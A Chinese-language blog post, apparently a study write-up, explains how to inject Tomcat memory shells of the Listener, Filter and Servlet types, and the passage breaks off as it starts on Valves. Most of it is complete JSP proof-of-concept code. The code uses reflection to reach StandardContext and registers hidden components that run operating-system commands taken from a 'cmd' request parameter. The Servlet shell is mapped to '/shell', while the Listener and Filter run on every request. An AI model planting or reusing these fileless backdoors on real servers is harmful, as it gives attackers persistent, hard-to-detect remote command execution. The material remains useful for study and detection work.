+<p>很明显，ServletRequestListener类型的是最适合用来做内存马的，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法，我们只需要在这个方法中写入恶意命令就可以达到攻击手段了</p>
+<p>例子：</p>
+<pre><code class="language-java">package Listener;
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
+import javax.servlet.annotation.WebListener;
+import java.io.IOException;
+
+@WebListener
+public class Hello_Listener implements ServletRequestListener {
+
+
+    @Override
+    public void requestDestroyed(ServletRequestEvent sre) {
+
+    }
+
+    @Override
+    public void requestInitialized(ServletRequestEvent sre) {
+        try {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (NullPointerException n) {
+            n.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>访问任意路由都会触发命令</p>
+<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1752213966755.png" alt="" loading="lazy"></figure>
+<p>我们刚刚只是演示了一下 Listener中的requestInitialized() 会在我们访问路由的时候自动调用，但是我们不可能可以直接去修改这个方法，那应该怎么动态的写入恶意的listener呢？</p>
+<h3 id="listener注册过程">Listener注册过程</h3>
+<p>断点就打在requestInitialized()方法上，我们看看在这之前都调用了什么隐藏帧，开始回溯寻找调用过程</p>
+<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1752213966772.png" alt="" loading="lazy"></figure>
+<p>先来看StandarContext#fireRequestInitEvent方法</p>
+<pre><code class="language-java">public boolean fireRequestInitEvent(ServletRequest request) {
+Object[] instances = this.getApplicationEventListeners();
+if (instances != null &amp;&amp; instances.length &gt; 0) {
+    ServletRequestEvent event = new ServletRequestEvent(this.getServletContext(), request);
+
+    for(int i = 0; i &lt; instances.length; ++i) {
+        if (instances[i] != null &amp;&amp; instances[i] instanceof ServletRequestListener) {
+            ServletRequestListener listener = (ServletRequestListener)instances[i];
+
+            try {
+                listener.requestInitialized(event);
+            } catch (Throwable var7) {
+                Throwable t = var7;
+                ExceptionUtils.handleThrowable(t);
+                this.getLogger().error(sm.getString(&quot;standardContext.requestListener.requestInit&quot;, new Object[]{instances[i].getClass().getName()}), t);
+                request.setAttribute(&quot;javax.servlet.error.exception&quot;, t);
+                return false;
+            }
+        }
+    }
+}
+
+return true;
+}
+</code></pre>
+<p>先是调用getApplicationEventListeners()获取到一个数组，然后遍历数组调用listener.requestInitialized(event);方法触发Litener，先步入</p>
+<p>getApplicationEventListeners()方法</p>
+<pre><code class="language-java">public Object[] getApplicationEventListeners() {
+    return applicationEventListenersList.toArray();
+}
+</code></pre>
+<p>发现信息是储存在applicationEventListenersList中的：</p>
+<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1752213966786.png" alt="" loading="lazy"></figure>
+<p>而且我们是可以通过StandardContext#addApplicationEventListener()方法来添加Listener</p>
+<pre><code class="language-java">public void addApplicationEventListener(Object listener) {
+this.applicationEventListenersList.add(listener);
+}
+</code></pre>
+<h3 id="注入listener">注入Listener</h3>
+<p>在往上看一帧</p>
+<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1752213966801.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1752213966816.png" alt="" loading="lazy"></figure>
+<p>发现在这执行了invoke方法 获取到了StandardContext的实例</p>
+<p>第二种方法获取：</p>
+<p>由于JSP内置了request对象，我们也可以使用同样的方式来获取</p>
+<pre><code class="language-java">&lt;%
+Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+reqF.setAccessible(true);
+Request req = (Request) reqF.get(request);
+//这里的Request为org.apache.catalina.connector.Request
+StandardContext context = (StandardContext) req.getContext();
+%&gt;
+</code></pre>
+<p>第三种：</p>
+<pre><code class="language-java">&lt;%
+WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+%&gt;
+</code></pre>
+<p>这里就用第二种来进行注入：</p>
+<p>这里先使用jsp文件进行注入，后面还会说实战怎么通过反序列化来加载</p>
+<pre><code class="language-java">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+ 
+&lt;%!
+    public class Shell_Listener implements ServletRequestListener {
+ 
+        public void requestInitialized(ServletRequestEvent sre) {
+            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
+           String cmd = request.getParameter(&quot;cmd&quot;);
+           if (cmd != null) {
+               try {
+                   Runtime.getRuntime().exec(cmd);
+               } catch (IOException e) {
+                   e.printStackTrace();
+               } catch (NullPointerException n) {
+                   n.printStackTrace();
+               }
+            }
+        }
+ 
+        public void requestDestroyed(ServletRequestEvent sre) {
+        }
+    }
+%&gt;
+&lt;%
+    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext context = (StandardContext) req.getContext();
+ 
+    Shell_Listener shell_Listener = new Shell_Listener();
+    context.addApplicationEventListener(shell_Listener);
+%&gt;
+</code></pre>
+<p>先访问一下jsp文件 这样就会把我们的恶意Listener注入了（访问这个jsp文件之后，会执行其中的代码，我们先是获取到了context上下文，然后把我们的恶意类添加到上下文中，然后在自动的调用我们的恶意方法）</p>
+<figure data-type="image" tabindex="11"><img src="https://bloyet.github.io/post-images/1752213966833.png" alt="" loading="lazy"></figure>
+<h2 id="filter型">Filter型</h2>
+<h3 id="filter调用分析">Filter调用分析</h3>
+<p>调用栈如下：注意的是 在我们给doFilter方法打上断点之后，已调试的模式去运行服务器，还需要去访问一下资源，在访问的过程中会触发Filter</p>
+<figure data-type="image" tabindex="12"><img src="https://bloyet.github.io/post-images/1752213966847.png" alt="" loading="lazy"></figure>
+<p>还是一样先看调用栈</p>
+<p>ApplicationFilterChain#internalDoFilter</p>
+<pre><code class="language-java">private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException {
+    if (this.pos &lt; this.n) {
+        ApplicationFilterConfig filterConfig = this.filters[this.pos++];
+
+        try {
+            Filter filter = filterConfig.getFilter();
+            if (request.isAsyncSupported() &amp;&amp; &quot;false&quot;.equalsIgnoreCase(filterConfig.getFilterDef().getAsyncSupported())) {
+                request.setAttribute(&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;, Boolean.FALSE);
+            }
+
+            if (Globals.IS_SECURITY_ENABLED) {
+                ServletRequest req = request;
+                ServletResponse res = response;
+                Principal principal = ((HttpServletRequest)req).getUserPrincipal();
+                Object[] args = new Object[]{req, res, this};
+                SecurityUtil.doAsPrivilege(&quot;doFilter&quot;, filter, classType, args, principal);
+            } else {
+                filter.doFilter(request, response, this);
+            }
+
+        } catch (ServletException | RuntimeException | IOException var15) {
+            Exception e = var15;
+            throw e;
+        } catch (Throwable var16) {
+            Throwable e = var16;
+            e = ExceptionUtils.unwrapInvocationTargetException(e);
+            ExceptionUtils.handleThrowable(e);
+            throw new ServletException(sm.getString(&quot;filterChain.filter&quot;), e);
+        }
+    } else {
+        try {
+            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
+                lastServicedRequest.set(request);
+                lastServicedResponse.set(response);
+            }
+
+            if (request.isAsyncSupported() &amp;&amp; !this.servletSupportsAsync) {
+                request.setAttribute(&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;, Boolean.FALSE);
+            }
+
+            if (request instanceof HttpServletRequest &amp;&amp; response instanceof HttpServletResponse &amp;&amp; Globals.IS_SECURITY_ENABLED) {
+                ServletRequest req = request;
+                ServletResponse res = response;
+                Principal principal = ((HttpServletRequest)req).getUserPrincipal();
+                Object[] args = new Object[]{req, res};
+                SecurityUtil.doAsPrivilege(&quot;service&quot;, this.servlet, classTypeUsedInService, args, principal);
+            } else {
+                this.servlet.service(request, response);
+            }
+        } catch (ServletException | RuntimeException | IOException var17) {
+            Exception e = var17;
+            throw e;
+        } catch (Throwable var18) {
+            Throwable e = var18;
+            e = ExceptionUtils.unwrapInvocationTargetException(e);
+            ExceptionUtils.handleThrowable(e);
+            throw new ServletException(sm.getString(&quot;filterChain.servlet&quot;), e);
+        } finally {
+            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
+                lastServicedRequest.set((Object)null);
+                lastServicedResponse.set((Object)null);
+            }
+
+        }
+
+    }
+}
+</code></pre>
+<p>在这里稍微了解一下filterConfig</p>
+<p>一个filterConfig对应一个Filter，用于存储Filter的上下文信息</p>
+<figure data-type="image" tabindex="13"><img src="https://bloyet.github.io/post-images/1752213966862.png" alt="" loading="lazy"></figure>
+<p>再去看看filters是怎么来的</p>
+<figure data-type="image" tabindex="14"><img src="https://bloyet.github.io/post-images/1752213966878.png" alt="" loading="lazy"></figure>
+<p>这里的<code>filters</code>属性是一个ApplicationFilterConfig数组。 我们直接去这个数组里怎么储存Filter的，很难找到（这里其实是有点难理解的，先跟着大佬文章看吧）我这里的初步理解是因为调用的ApplicationFilterChain所以要找到ApplicationFilterChain的Filter，我们就继续往上看调用帧</p>
+<p>StandardWrapperValve#invoke方法中</p>
+<figure data-type="image" tabindex="15"><img src="https://bloyet.github.io/post-images/1752213966894.png" alt="" loading="lazy"></figure>
+<p>看看它是怎么来的：</p>
+<figure data-type="image" tabindex="16"><img src="https://bloyet.github.io/post-images/1752213966910.png" alt="" loading="lazy"></figure>
+<p>步入ApplicationFilterFactory.createFilterChain方法：</p>
+<pre><code class="language-java">public static ApplicationFilterChain createFilterChain(ServletRequest request,
+            Wrapper wrapper, Servlet servlet) {
+ 
+        ...
+        // Request dispatcher in use
+        filterChain = new ApplicationFilterChain();
+ 
+        filterChain.setServlet(servlet);
+        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
+ 
+        // Acquire the filter mappings for this Context
+        StandardContext context = (StandardContext) wrapper.getParent();
+        FilterMap filterMaps[] = context.findFilterMaps();
+ 
+        ...
+ 
+        String servletName = wrapper.getName();
+ 
+        // Add the relevant path-mapped filters to this filter chain
+        for (FilterMap filterMap : filterMaps) {
+            
+            ...
+            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
+                    context.findFilterConfig(filterMap.getFilterName());
+            ...
+ 
+            filterChain.addFilter(filterConfig);
+        }
+ 
+        ...
+ 
+        // Return the completed filter chain
+        return filterChain;
+    }
+</code></pre>
+<p>只看其中关键代码：</p>
+<pre><code class="language-java">首先通过filterChain = new ApplicationFilterChain()创建一个空的filterChain对象
+然后通过wrapper.getParent()函数来获取StandardContext对象
+接着获取StandardContext中的FilterMaps对象，FilterMaps对象中存储的是各Filter的名称路径等信息
+最后根据Filter的名称，在StandardContext中获取FilterConfig
+通过filterChain.addFilter(filterConfig)将一个filterConfig添加到filterChain中
+</code></pre>
+<p>这是一套完整的调用逻辑了，但是我们应该怎么把恶意的Filter注入呢？</p>
+<p>我们看到刚刚分析的时候，是在最后的时候把filter取出来进行调用，在这之前都是封装在filterConfig中，所以我们一开始也是必须得把恶意的filter放入filterConfig中，所以我们就来看看它其中的格式（这里直接看佬的，不浪费时间找了）：</p>
+<h3 id="filter注册分析">Filter注册分析</h3>
+<h4 id="standardcontext-2">StandardContext</h4>
+<p>我们能看到此时的上下文对象<code>StandardContext</code>实际上是包含了这三者的：</p>
+<figure data-type="image" tabindex="17"><img src="https://bloyet.github.io/post-images/1752213966925.png" alt="" loading="lazy"></figure>
+<h4 id="filterconfigs">filterConfigs：</h4>
+<p>其中filterConfigs包含了当前的上下文信息<code>StandardContext</code>、以及<code>filterDef</code>等信息</p>
+<figure data-type="image" tabindex="18"><img src="https://bloyet.github.io/post-images/1752213966942.png" alt="" loading="lazy"></figure>
+<h4 id="filterdef">filterDef：</h4>
+<p>存放了filter的定义，包括filterClass、filterName等信息</p>
+<figure data-type="image" tabindex="19"><img src="https://bloyet.github.io/post-images/1752213966957.png" alt="" loading="lazy"></figure>
+<h4 id="filterdefs">filterDefs</h4>
+<p>是一个HashMap，以键值对的形式存储<code>filterDef</code></p>
+<figure data-type="image" tabindex="20"><img src="https://bloyet.github.io/post-images/1752213966988.png" alt="" loading="lazy"></figure>
+<h4 id="filtermaps">filterMaps</h4>
+<p>以array的形式存放各filter的路径映射信息</p>
+<figure data-type="image" tabindex="21"><img src="https://bloyet.github.io/post-images/1752213966972.png" alt="" loading="lazy"></figure>
+<p>必要属性：<code>dispatcherMapping</code>、<code>filterName</code>、<code>urlPatterns</code></p>
+<h3 id="注册filter思路">注册Filter思路</h3>
+<ol>
+<li>获取StandardContext对象</li>
+<li>创建恶意Filter</li>
+<li>使用FilterDef对Filter进行封装，并添加必要的属性</li>
+<li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li>
+<li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li>
+</ol>
+<h4 id="获取standardcontext对象">获取StandardContext对象</h4>
+<p>StandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此我们有很多方法来获取StandardContext对象。</p>
+<p>Tomcat在启动时会为每个Context都创建个ServletContext对象，来表示一个Context，从而可以将ServletContext转化为StandardContext。</p>
+<pre><code class="language-java">//获取ApplicationContextFacade类
+ServletContext servletContext = request.getSession().getServletContext();
+ 
+//反射获取ApplicationContextFacade类属性context为ApplicationContext类
+Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+appContextField.setAccessible(true);
+ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
+ 
+//反射获取ApplicationContext类属性context为StandardContext类
+Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
+standardContextField.setAccessible(true);
+StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="https://bloyet.github.io/post-images/1752213967003.png" alt="" loading="lazy"></figure>
+<h4 id="1-创建恶意filter">1. 创建恶意Filter</h4>
+<pre><code class="language-java">public class CmdFilter implements Filter {
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+        System.out.println(&quot;Filter 初始构造完成&quot;);
+    }
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+        filterChain.doFilter(servletRequest,servletResponse);
+    }
+
+    @Override
+    public void destroy() {
+        System.out.println(&quot;filter 销毁&quot;);
+    }
+}
+</code></pre>
+<h4 id="filterdef对filter进行封装">FilterDef对Filter进行封装</h4>
+<pre><code class="language-java">String name=&quot;filterShell&quot;;
+FilterDef filterDef = new FilterDef();
+filterDef.setFilter(new CmdFilter());
+filterDef.setFilterClass(CmdFilter.class.getName());
+filterDef.setFilterName(name);
+context.addFilterDef(filterDef);
+</code></pre>
+<h4 id="创建filtermap类">创建filterMap类</h4>
+<pre><code class="language-java">FilterMap filterMap = new FilterMap();
+	filterMap.setFilterName(name);
+	filterMap.setDispatcher(DispatcherType.REQUEST.name());
+	filterMap.addURLPattern(&quot;/*&quot;);
+	context.addFilterMap(filterMap);
+</code></pre>
+<h4 id="注入到filterconfigs中">注入到filterConfigs中</h4>
+<p>这里因为ApplicationFilterConfig的构造方法不是公共的，需要反射来进行调用</p>
+<pre><code class="language-java">Field Configs = context.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+Configs.setAccessible(true);
+Map filterConfigs = (Map) Configs.get(context);
+Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+constructor.setAccessible(true);
+ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context,filterDef);
+filterConfigs.put(name, filterConfig);
+</code></pre>
+<h3 id="poc">POC</h3>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;
+&lt;%@ page import=&quot;java.util.Map&quot; %&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%!
+    public class CmdFilter implements Filter {
+
+        @Override
+        public void init(FilterConfig filterConfig)  {
+            System.out.println(&quot;shell&quot;);
+        }
+
+        @Override
+        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException, IOException {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+            chain.doFilter(request,response);
+        }
+
+        @Override
+        public void destroy() {
+        }
+    }
+%&gt;
+
+
+
+&lt;%
+    //获取ApplicationContextFacade类
+    ServletContext servletContext = request.getSession().getServletContext();
+
+//反射获取ApplicationContextFacade类属性context为ApplicationContext类
+    Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+    appContextField.setAccessible(true);
+    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
+
+//反射获取ApplicationContext类属性context为StandardContext类
+    Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
+    standardContextField.setAccessible(true);
+    StandardContext context = (StandardContext) standardContextField.get(applicationContext);
+%&gt;
+
+&lt;%
+    String name=&quot;filtershell&quot;;
+    FilterDef filterDef = new FilterDef();
+    filterDef.setFilter(new CmdFilter());
+    filterDef.setFilterClass(CmdFilter.class.getName());
+    filterDef.setFilterName(name);
+    context.addFilterDef(filterDef);
+%&gt;
+
+&lt;%
+    FilterMap filterMap = new FilterMap();
+    filterMap.setFilterName(name);
+    filterMap.setDispatcher(DispatcherType.REQUEST.name());
+    filterMap.addURLPattern(&quot;/*&quot;);
+    context.addFilterMap(filterMap);
+%&gt;
+
+
+&lt;%
+    Field Configs = context.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+    Configs.setAccessible(true);
+    Map filterConfigs = (Map) Configs.get(context);
+
+    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+    constructor.setAccessible(true);
+    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context,filterDef);
+    filterConfigs.put(name, filterConfig);
+%&gt;
+</code></pre>
+<p>还是一样 得先访问jsp木马文件，然后就会自动注入进去，注入完毕之后在我们访问资源之前就会进行拦截执行命令</p>
+<figure data-type="image" tabindex="23"><img src="https://bloyet.github.io/post-images/1752213967018.png" alt="" loading="lazy"></figure>
+<h2 id="servlet型">Servlet型</h2>
+<p>其实思路都差不多，就是看怎么把恶意类注入到上下文中，每一种类型涉及的方法不一样，所以注入时调用的方法也不一样</p>
+<h3 id="编写恶意servlet">编写恶意servlet</h3>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%!
+    //jsp定义或者声明需要加上！
+    public class CmdServlet extends HttpServlet {
+        @Override
+        public void init(ServletConfig servletConfig){
+
+        }
+
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+
+        @Override
+        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            if(cmd!=null){
+                try {
+                    Runtime.getRuntime().exec(cmd);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+
+        }
+
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+
+        @Override
+        public void destroy() {
+
+        }
+    }
+%&gt;
+</code></pre>
+<h3 id="注入servlet内存马">注入servlet内存马</h3>
+<p>这里就只看ConfigContext#configureContext注册Servlet流程过程了，因为按照顺序来说是先listener-filter-servlet</p>
+<p>先写出大致步骤</p>
+<pre><code class="language-java">由上下文context创建wrapper，用来包装servlet
+设置Servlet名称
+设置Servlet全类名
+wrapoer设置servlet
+将wrapper放入context
+添加url路径映射
+</code></pre>
+<h4 id="创建standardwrapper">创建StandardWrapper</h4>
+<p>在<code>StandardContext</code>#<code>startInternal</code>中，调用了<code>fireLifecycleEvent()</code>方法解析web.xml文件</p>
+<figure data-type="image" tabindex="24"><img src="https://bloyet.github.io/post-images/1752213967033.png" alt="" loading="lazy"></figure>
+<p>看看fireLifecycleEvent()方法的具体实现：</p>
+<pre><code class="language-java">protected void fireLifecycleEvent(String type, Object data) {
+    LifecycleEvent event = new LifecycleEvent(this, type, data);
+    Iterator i$ = this.lifecycleListeners.iterator();
+
+    while(i$.hasNext()) {
+        LifecycleListener listener = (LifecycleListener)i$.next();
+        listener.lifecycleEvent(event);
+    }
+
+}
+</code></pre>
+<p>最终通过ContextConfig#webConfig()方法解析web.xml获取各种配置参数,里面通过调用configureContext方法来从context里面获取web.xml里面的信息</p>
+<figure data-type="image" tabindex="25"><img src="https://bloyet.github.io/post-images/1752213967049.png" alt="" loading="lazy"></figure>
+<p>获取到信息之后，是通过ContextConfig#addServletContainerInitializer来添加</p>
+<figure data-type="image" tabindex="26"><img src="https://bloyet.github.io/post-images/1752213967065.png" alt="" loading="lazy"></figure>
+<p>通过<code>configureContext(webXml)</code>方法创建StandWrapper对象，并根据解析参数初始化StandWrapper对象</p>
+<pre><code class="language-java"> private void configureContext(WebXml webxml) {
+        // As far as possible, process in alphabetical order so it is easy to
+        // check everything is present
+        // Some validation depends on correct public ID
+        context.setPublicId(webxml.getPublicId());
+ 
+...   //设置StandardContext参数
+ 
+        
+        for (ServletDef servlet : webxml.getServlets().values()) {
+ 
+            //创建StandardWrapper对象
+            Wrapper wrapper = context.createWrapper();
+ 
+            if (servlet.getLoadOnStartup() != null) {
+ 
+                //设置LoadOnStartup属性
+                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
+            }
+            if (servlet.getEnabled() != null) {
+                wrapper.setEnabled(servlet.getEnabled().booleanValue());
+            }
+ 
+            //设置ServletName属性
+            wrapper.setName(servlet.getServletName());
+            Map&lt;String,String&gt; params = servlet.getParameterMap();
+            for (Entry&lt;String, String&gt; entry : params.entrySet()) {
+                wrapper.addInitParameter(entry.getKey(), entry.getValue());
+            }
+            wrapper.setRunAs(servlet.getRunAs());
+            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();
+            for (SecurityRoleRef roleRef : roleRefs) {
+                wrapper.addSecurityReference(
+                        roleRef.getName(), roleRef.getLink());
+            }
+ 
+            //设置ServletClass属性
+            wrapper.setServletClass(servlet.getServletClass());
+            ...
+            wrapper.setOverridable(servlet.isOverridable());
+ 
+            //将包装好的StandWrapper添加进ContainerBase的children属性中
+            context.addChild(wrapper);
+ 
+           for (Entry&lt;String, String&gt; entry :
+                webxml.getServletMappings().entrySet()) {
+          
+            //添加路径映射
+            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
+        }
+        }
+        ...
+    }
+</code></pre>
+<p>最后通过<code>addServletMappingDecoded()</code>方法添加Servlet对应的url映射</p>
+<h4 id="加载standwrapper">加载StandWrapper</h4>
+<p>在<code>StandardContext#startInternal</code>方法通过<code>findChildren()</code>获取<code>StandardWrapper</code>类</p>
+<figure data-type="image" tabindex="27"><img src="https://bloyet.github.io/post-images/1752213967080.png" alt="" loading="lazy"></figure>
+<p>最后依次加载完Listener、Filter后，就通过<code>loadOnStartUp()</code>方法加载wrapper</p>
+<pre><code class="language-java">    public boolean loadOnStartup(Container children[]) {
+ 
+        // Collect &quot;load on startup&quot; servlets that need to be initialized
+        TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = new TreeMap&lt;&gt;();
+        for (Container child : children) {
+            Wrapper wrapper = (Wrapper) child;
+            int loadOnStartup = wrapper.getLoadOnStartup();
+ 
+            //判断属性loadOnStartup的值
+            if (loadOnStartup &lt; 0) {
+                continue;
+            }
+            Integer key = Integer.valueOf(loadOnStartup);
+            ArrayList&lt;Wrapper&gt; list = map.get(key);
+            if (list == null) {
+                list = new ArrayList&lt;&gt;();
+                map.put(key, list);
+            }
+            list.add(wrapper);
+        }
+ 
+        // Load the collected &quot;load on startup&quot; servlets
+        for (ArrayList&lt;Wrapper&gt; list : map.values()) {
+            for (Wrapper wrapper : list) {
+                try {
+                    wrapper.load();
+                }
+</code></pre>
+<p>注意这里对于Wrapper对象中<code>loadOnStartup</code>属性的值进行判断，只有大于0的才会被放入list进行后续的<code>wrapper.load()</code>加载调用。</p>
+<p>这里对应的实际上就是Tomcat Servlet的懒加载机制，可以通过<code>loadOnStartup</code>属性值来设置每个Servlet的启动顺序。默认值为-1，所以是需要我们手动修改的</p>
+<p>总结一下需要完成哪些：</p>
+<pre><code class="language-java">获取StandardContext对象
+编写恶意Servlet
+通过StandardContext.createWrapper()创建StandardWrapper对象
+设置StandardWrapper对象的loadOnStartup属性值
+设置StandardWrapper对象的ServletName属性值
+设置StandardWrapper对象的ServletClass属性值
+将StandardWrapper对象添加进StandardContext对象的children属性中
+通过StandardContext.addServletMappingDecoded()添加对应的路径映射
+</code></pre>
+<p>获取StandardContext对象：</p>
+<pre><code class="language-java">&lt;%
+    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext standardContext = (StandardContext) req.getContext();
+%&gt;
+</code></pre>
+<p>恶意类：</p>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%!
+    //jsp定义或者声明需要加上！
+    public class CmdServlet extends HttpServlet {
+        @Override
+        public void init(ServletConfig servletConfig){
+
+        }
+
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+
+        @Override
+        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            if(cmd!=null){
+                try {
+                    Runtime.getRuntime().exec(cmd);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+
+        }
+
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+
+        @Override
+        public void destroy() {
+
+        }
+    }
+%&gt;
+</code></pre>
+<p>创建StandardWrapper对象</p>
+<pre><code class="language-java">&lt;%
+    CmdServlet cmdServlet = new CmdServlet();
+    String name = cmdServlet.getClass().getSimpleName();
+ 
+    Wrapper wrapper = standardContext.createWrapper();
+    wrapper.setLoadOnStartup(1);
+    wrapper.setName(name);
+    wrapper.setServlet(cmdServlet);
+    wrapper.setServletClass(cmdServlet.getClass().getName());
+%&gt;
+</code></pre>
+<p>添加进上下文：</p>
+<pre><code class="language-java">&lt;%
+    standardContext.addChild(wrapper);
+    standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);
+%&gt;
+</code></pre>
+<h3 id="poc-2">POC</h3>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;
+&lt;%!
+    //jsp定义或者声明需要加上！
+    public class CmdServlet extends HttpServlet {
+        @Override
+        public void init(ServletConfig servletConfig){
+
+        }
+
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+
+        @Override
+        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            if(cmd!=null){
+                try {
+                    Runtime.getRuntime().exec(cmd);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+
+        }
+
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+
+        @Override
+        public void destroy() {
+
+        }
+    }
+%&gt;
+
+&lt;%
+    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext standardContext = (StandardContext) req.getContext();
+%&gt;
+
+&lt;%
+    CmdServlet cmdServlet = new CmdServlet();
+    String name = cmdServlet.getClass().getSimpleName();
+
+    Wrapper wrapper = standardContext.createWrapper();
+    wrapper.setLoadOnStartup(1);
+    wrapper.setName(name);
+    wrapper.setServlet(cmdServlet);
+    wrapper.setServletClass(cmdServlet.getClass().getName());
+%&gt;
+
+&lt;%
+    standardContext.addChild(wrapper);
+    standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);
+%&gt;
+</code></pre>
+<p>得先访问jsp文件 加载进去之后在对应的路径下执行命令</p>
+<figure data-type="image" tabindex="28"><img src="https://bloyet.github.io/post-images/1752213967096.png" alt="" loading="lazy"></figure>
+<h2 id="valve型">Valve型</h2>
+<p>先学习一下什么是Valve</p>
+<p>我们先来简单了解一下Tomcat中的<code>管道机制</code></p>
+<p>我们知道，当Tomcat接收到客户端请求时，首先会使用<code>Connector</code>进行解析，然后发送到<code>Container</code>进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到Servlet进行处理的呢？这里涉及到的机制就是Tomcat管道机制。</p>
